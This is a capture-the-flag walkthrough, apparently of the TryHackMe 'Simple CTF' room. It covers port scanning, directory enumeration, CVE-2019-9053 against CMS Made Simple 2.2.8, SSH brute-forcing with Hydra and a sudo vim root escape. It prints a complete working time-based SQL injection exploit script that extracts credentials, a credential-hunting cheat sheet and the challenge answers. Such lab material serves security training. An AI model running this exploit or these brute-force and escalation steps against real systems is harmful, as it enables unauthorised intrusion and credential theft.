<img width="1983" height="793" alt="simple" src="https://github.com/user-attachments/assets/832f6dca-c9dd-4bcb-8f15-8651d4160711" />

## Learning Objectives

By completing this walkthrough and analyzing the target environment, you will achieve the following technical competencies:

* <img src="https://img.shields.io/badge/-Reconnaissance-blue?style=flat-square" /> **Network Reconnaissance & Service Discovery:** Perform port scanning with `Nmap` to identify active services, version banners, and insecure configurations (such as Anonymous FTP access).
* <img src="https://img.shields.io/badge/-Web%20Enumeration-orange?style=flat-square" /> **Web Directory Enumeration:** Execute automated directory brute-forcing using `Gobuster` to uncover hidden endpoints and identify target Content Management Systems (CMS Made Simple).
* <img src="https://img.shields.io/badge/-Exploitation-red?style=flat-square" /> **Vulnerability Research & PoC Execution:** Research public vulnerability databases (Exploit-DB), leverage `CVE-2019-9053` (SQL Injection), and adapt Python exploit scripts for execution.
* <img src="https://img.shields.io/badge/-Credential%20Attacks-yellow?style=flat-square" /> **Credential Cracking & Brute-Forcing:** Conduct hash cracking and perform targeted SSH authentication brute-forcing using `Hydra` and `Hashcat`.
* <img src="https://img.shields.io/badge/-PrivSec-purple?style=flat-square" /> **Linux Privilege Escalation:** Evaluate local `sudo` permissions (`sudo -l`) and apply **GTFOBins** techniques to exploit `NOPASSWD` misconfigurations (`vim`) for root shell access.

###  Golden Recon Commands 

#### 1. Nmap — Full TCP Port & Service Enumeration

Scans all 65,535 TCP ports, runs default scripts, and detects service versions with verbose output saved to all formats (`.nmap`, `.gnmap`, `.xml`).

```bash
nmap -Pn -p- -sC -sV <MACHINE_IP> -vvv -oA nmap_full

```

#### 2. Gobuster — Web Content Discovery

Enumerates hidden web directories and files using common wordlists.

```bash
gobuster dir -u http://<MACHINE_IP> -w /usr/share/wordlists/dirb/common.txt

```

#### 3. DIRB — Directory Enumeration

Alternative web directory scanner useful for recursive URL brute-forcing.

```bash
dirb http://<MACHINE_IP>

- **Identified directories:**

```text
/simple/
/simple/admin/
/simple/assets/
/simple/doc/
/simple/lib/
/simple/modules/
/simple/tmp/
/simple/uploads/
```

#### 4. Netdiscover — Network Host Discovery

Passive/active ARP reconnaissance tool to discover live hosts on a local subnet.

```bash
netdiscover

```

#### 5. ARP Scan — Local Network Enumeration

Quick local network interface scan to discover internal IP addresses.

```bash
arp-scan -l

```

---

> **Dependency Note & Troubleshooting:**
> The original Exploit-DB script (`46635.py`) relies on the `termcolor` library to format terminal output. If running the script in a native Python 2 environment, install the missing dependency prior to execution:
>
> ```bash
> python2 -m pip install termcolor
> ```
> 
> **Command Breakdown:**
> * `python2`: Invokes the Python 2 interpreter (must be installed and available in PATH).
> * `-m pip`: Executes the `pip` package manager module directly through the specified interpreter.
> * `install termcolor`: Downloads and installs the `termcolor` module for terminal output formatting.
>
> *Alternative:* If migrating the script to Python 3, you can either install `termcolor` via `pip3 install termcolor` or refactor the print statements to remove the color parameters entirely.

# Challenge Questions

## Enumeration

### 1. How many services are running on ports below 1000?

#  Nmap Scan Results

> **Scan Command:** `nmap -Pn -p- -sC -sV 10.145.135.187 -vvv -oA nmap_full`  

---

##  Raw Nmap Terminal Output

```text
┌──(gokhan㉿kali)-[~]
└─$ nmap -Pn -p- -sC -sV 10.145.135.187 -vvv -oA nmap_full
Starting Nmap 7.93 ( [https://nmap.org](https://nmap.org) ) at 2026-09-14 16:25 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:25
Completed Parallel DNS resolution of 1 host. at 16:25, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:25
Scanning ip-10-145-135-187.us-west-2.compute.internal (10.145.135.187) [65535 ports]
Discovered open port 21/tcp on 10.145.135.187
Discovered open port 80/tcp on 10.145.135.187
Connect Scan Timing: About 20.20% done; ETC: 16:27 (0:02:03 remaining)
Connect Scan Timing: About 48.51% done; ETC: 16:27 (0:01:05 remaining)
Discovered open port 2222/tcp on 10.145.135.187
Completed Connect Scan at 16:26, 104.48s elapsed (65535 total ports)
Initiating Service scan at 16:26
Scanning 3 services on ip-10-145-135-187.us-west-2.compute.internal (10.145.135.187)
Completed Service scan at 16:26, 6.02s elapsed (3 services on 1 host)
NSE: Script scanning 10.145.135.187.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:26
NSE: [ftp-bounce 10.145.135.187:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.76% done; ETC: 16:27 (0:00:00 remaining)
Completed NSE at 16:27, 30.24s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.00s elapsed
Nmap scan report for ip-10-145-135-187.us-west-2.compute.internal (10.145.135.187)
Host is up, received user-set (0.0025s latency).
Scanned at 2026-09-14 16:25:05 UTC for 141s
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.145.109.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
|   256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:27
Completed NSE at 16:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . 
Nmap done: 1 IP address (1 host up) scanned in 141.21 seconds


## Enumeration

### **1- How many services are running under port 1000?**


From the Nmap scan:

```text
21/tcp   open  ftp     syn-ack  vsftpd 3.0.3
80/tcp   open  http    syn-ack  Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     syn-ack  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

The Nmap scan identified **two services running on ports below 1000**:

- `21/tcp` — FTP (vsftpd 3.0.3)
- `80/tcp` — HTTP (Apache 2.4.18)

Port `2222/tcp` — SSH is above 1000, so it is not included.

**Answer:** `2`

### 2. What is running on the higher port?

From the Nmap scan:

```text
2222/tcp open  ssh  syn-ack  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

The higher port, **2222/tcp**, is running an **SSH service**.

**Answer:** `SSH`

---

## Exploitation

### 3. What's the CVE you're using against the application?

Now that we have identified an HTTP service on port `80`, let's enumerate the web server for hidden directories and application content using **DIRB or Gobuster**.

```bash
dirb http://10.145.135.187

gobuster dir -u http://10.145.135.187 -w /usr/share/wordlists/dirb/common.txt
```

<img width="932" height="543" alt="DIRB or Gobuster directory enumeration" src="https://github.com/user-attachments/assets/7116c320-6ef1-4da9-b080-456467a373f8" />

From the gobuster result we were able to find a webpage ‘simple’. Let’s browse simple through the browser.
<img width="1917" height="870" alt="image" src="https://github.com/user-attachments/assets/4f5b1147-b2ae-417d-a9bc-01465dff54d8" />

The website is running CMS Made Simple 2.2.8. Let's check Exploit-DB for known exploits.

The directory enumeration reveals additional web content that can be investigated further.

Browsing the discovered CMS application reveals the following information:

<img width="1891" height="970" alt="CMS Made Simple web application" src="https://github.com/user-attachments/assets/833cce96-0bb6-4c7b-884d-f36fe1952c46" />

```text
© Copyright 2004 - 2024 - CMS Made Simple
This site is powered by CMS Made Simple version 2.2.8
```

The target is running:

```text
CMS Made Simple 2.2.8
```

<img width="913" height="823" alt="CMS Made Simple version identification" src="https://github.com/user-attachments/assets/b0d23b43-57e4-43b9-99fa-5a8cd38c06c8" />

With the application and version identified, we can research known vulnerabilities affecting this release.

```bash
searchsploit "CMS Made Simple"
```

The results identify an SQL injection vulnerability affecting versions of CMS Made Simple prior to `2.2.10`:

```text
CMS Made Simple < 2.2.10 - SQL Injection
```

<img width="1900" height="974" alt="SearchSploit CMS Made Simple results" src="https://github.com/user-attachments/assets/eaeffdd4-5de5-4a18-ab12-4b666d542275" />

<img width="1021" height="849" alt="CMS Made Simple SQL Injection exploit details" src="https://github.com/user-attachments/assets/31263cbc-b8e8-4287-8e15-370049031e4b" />

The corresponding Exploit-DB entry is:

```text
Exploit-DB: 46635
CVE: CVE-2019-9053
```

### 4. To what kind of vulnerability is the application vulnerable?


Based on our vulnerability research, **CMS Made Simple 2.2.8** is affected by **CVE-2019-9053**.

The SearchSploit results identify the vulnerability as:

```text
CMS Made Simple < 2.2.10 - SQL Injection
```
<img width="922" height="150" alt="image" src="https://github.com/user-attachments/assets/1e1ff0b5-326c-47c0-81f9-8f37e1deab14" />

This vulnerability is a **SQL Injection (SQLi)** vulnerability.

**SQL Injection (SQLi)** occurs when an application fails to properly handle user-controlled input before including it in a SQL query. This can allow an attacker to manipulate database queries and potentially retrieve information from the application's database.

For additional hands-on practice with SQL Injection:

**TryHackMe:** SQL Injection  
https://tryhackme.com/r/room/sqlinjectionlm

<img width="500" height="486" alt="image" src="https://github.com/user-attachments/assets/95629590-2cfc-483b-9d1a-eccb7bb2c41e" />

**Answer:** `SQL Injection (SQLi)`


### 5. What's the password?


## Password & Credential Discovery Cheat Sheet

**In CTFs, passwords or credentials are commonly obtained from the following sources:**

* **Source Code**

  ```bash
  curl http://MACHINE_IP
  ```

  Browser: `Ctrl+U`

* **robots.txt**

  ```bash
  curl http://MACHINE_IP/robots.txt
  ```

* **Hidden Directories**

  ```bash
  gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
  ```

* **Configuration Files**

  ```bash
  cat config.php
  cat settings.php
  ```

* **`.env` Files**

  ```bash
  cat .env
  ```

* **Backup Files**

  ```bash
  find /var/www -type f -name "*.bak" 2>/dev/null
  ```

* **Database Records**

  ```bash
  mysql -u USERNAME -p
  ```

  ```sql
  SHOW DATABASES;
  SHOW TABLES;
  SELECT * FROM users;
  ```

* **Password Hashes**

  ```bash
  hashid HASH
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  ```

  Lookup: `CrackStation` / `Hashes.com`

* **Password Testing / Hydra**

  If you discover a username and SSH is available:

  ```bash
  hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt MACHINE_IP ssh
  ```

  **Simple CTF Example:**

  ```text
  Username: mitch
  Password: secret
  ```

* **PCAP / Network Traffic**

  ```text
  http.request.method == "POST"
  ftp
  telnet
  ```

  Wireshark: `Follow → TCP Stream`

* **User Files**

  ```bash
  grep -RniE "password|secret" /home 2>/dev/null
  ```

* **Credential Reuse**

  ```bash
  ssh USERNAME@MACHINE_IP
  ftp MACHINE_IP
  ```
  * **Vulnerable Application / Exploit**

  Search for a known exploit:

  ```bash
  searchsploit "CMS Made Simple"
  ```

  Save the Exploit-DB Python code as:

  ```text
  exploit.py
  ```

  Run the exploit:

  ```bash
  python3 exploit.py -u http://MACHINE_IP/simple/
  ```

  > **Why Python?** Python is used to **run the exploit script**. Python itself is not the exploit.

  Possible output:

  ```text
  Username + Salt + Password Hash
  ```

  If the exploit supports cracking:

  ```bash
  python3 exploit.py -u http://MACHINE_IP/simple/ --crack -w /usr/share/wordlists/rockyou.txt
  ```

### 5. What's the password?

### **Vulnerable Application / Exploit**

First, search for a known exploit:

```bash
searchsploit "CMS Made Simple"
```
<img width="1907" height="495" alt="image" src="https://github.com/user-attachments/assets/24d21642-0a10-4535-b6d8-8a7abd8b991a" />
<img width="1756" height="1015" alt="image" src="https://github.com/user-attachments/assets/c4b1f8dd-1cf5-445f-9c93-787fc8b20e90" />


If an exploit is available on Exploit-DB, copy the Python exploit code to the AttackBox/Kali machine and save it as a `.py` file:

```bash
nano exploit.py
```

Paste the exploit code, then save the file as:

```text
exploit.py
```

> **Why Python?** Python is used to **run the exploit script** for CVE-2019-9053. Python itself is not the exploit.

Run the exploit against the target:

```bash
python3 exploit.py -u http://MACHINE_IP/simple/
```

> **Note:** Some older Exploit-DB scripts were written for Python 2 and may produce errors when run with Python 3. They may require minor syntax updates or the appropriate Python version.

**Quick solution:**

1. Try running the script with Python 2:

```bash
python2 exploit.py
```

2. If Python 2 is unavailable, update the script for Python 3 compatibility. Common changes include:

```python
# Python 2
print "Hello"

# Python 3
print("Hello")
```

You may also need to update older libraries, `raw_input()`, `urllib`, or string/byte handling.

The exploit may reveal information such as:

```text
Username
Salt
Password Hash
```

For example:

```text
Username: mitch
```

Once a valid username is discovered, continue with the appropriate credential-testing step for the CTF. For example, if SSH is available and the challenge permits password testing:

```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt MACHINE_IP ssh
```

Example result:

```text
Username: mitch
Password: secret
```

## Source Code (`exploit.py`)

```python
#!/usr/bin/env python3
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Python 3 Porting & Refactoring
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# CVE : CVE-2019-9053

import argparse
import hashlib
import time
import requests
from termcolor import colored, cprint

parser = argparse.ArgumentParser(description="CMS Made Simple <= 2.2.9 SQL Injection Exploit (Python 3)")
parser.add_argument('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_argument('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for cracking admin password")
parser.add_argument('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options = parser.parse_args()

if not options.url:
    print("[+] Specify a target URL")
    print("[+] Example usage (no cracking): python3 exploit.py -u http://target-uri")
    print("[+] Example usage (with cracking): python3 exploit.py -u http://target-uri -c -w /path-wordlist")
    print("[+] Note: Adjust the TIME variable in script if needed (time-based SQLi).")
    exit()

url_vuln = options.url.rstrip('/') + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist

def crack_password():
    global password, output, wordlist, salt
    try:
        with open(wordlist, 'r', encoding='latin-1') as wordlist_file:
            for line in wordlist_file:
                line = line.strip()
                beautify_print_try(line)
                to_hash = (str(salt) + line).encode('utf-8')
                if hashlib.md5(to_hash).hexdigest() == password:
                    output += "\n[+] Password cracked: " + line
                    break
    except FileNotFoundError:
        output += "\n[-] Wordlist file not found!"

def beautify_print_try(value):
    global output
    print("\033c", end="")
    cprint(output, 'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print("\033c", end="")
    cprint(output, 'green', attrs=['bold'])

def dump_salt():
    global flag, salt, output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag, password, output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag, db_name, output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag, email, output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

if __name__ == "__main__":
    dump_salt()
    dump_username()
    dump_email()
    dump_password()

    if options.cracking:
        print(colored("[*] Attempting password crack...", "yellow"))
        crack_password()

    beautify_print()

```

---

### 6. Where can you login with the details obtained?

<img width="935" height="164" alt="image" src="https://github.com/user-attachments/assets/6c5061d4-3ee2-49d1-8a1e-8154ba015696" />

**Answer: SSH**


---

## User Access

### 7. What's the user flag?


#### SSH Authentication / Initial Access

The target machine uses a non-standard SSH port (`2222`). Connect using the extracted credentials:

* **Host:** `10.145.143.226`
* **Port:** `2222`
* **User:** `mitch`

```bash
# Connect via SSH on custom port
ssh mitch@10.145.143.226 -p 2222

```
<img width="872" height="388" alt="image" src="https://github.com/user-attachments/assets/91995e2d-6a27-4fd0-a8eb-fd2d83ac51b1" />


### 8. Is there any other user in the home directory? What's its name?
$ cd /home
$ ls
mitch  **sunbath**

<img width="157" height="73" alt="image" src="https://github.com/user-attachments/assets/d7784e1e-cee3-46c4-ab12-ecd37b7c06f8" />

---

## Privilege Escalation

### 9. What can you leverage to spawn a privileged shell?
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/**vim**

<img width="475" height="127" alt="image" src="https://github.com/user-attachments/assets/7c174692-37fc-484b-983f-2d93e89f3683" />

### 10. What's the root flag?

## Privilege Escalation

### 1. User Enumeration

Check the home directory to identify system users:

```bash
cd /home
ls

```

**Output:**

```text
mitch  sunbath

```

---

### 2. Sudo Privileges Check

Inspect current user's `sudo` privileges:

```bash
sudo -l

```

**Output:**

```text
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```

The user `mitch` can execute `/usr/bin/vim` as `root` without providing a password.

---

### 3. Root Exploitation (GTFOBins - Vim Escaping)
<img width="940" height="235" alt="image" src="https://github.com/user-attachments/assets/84ab650a-d472-407c-b9e6-e8a6e450a3f3" />

Exploit the binary execution vector using Vim's shell escape feature:

```bash
sudo vim -c ':!/bin/sh'

```

---

### 4. Root Flag Retrieval

Verify root access and read the target flag:

```console
# whoami
root

# cd /root
# ls
root.txt

# cat root.txt
W3ll d0n3. You made it!

```

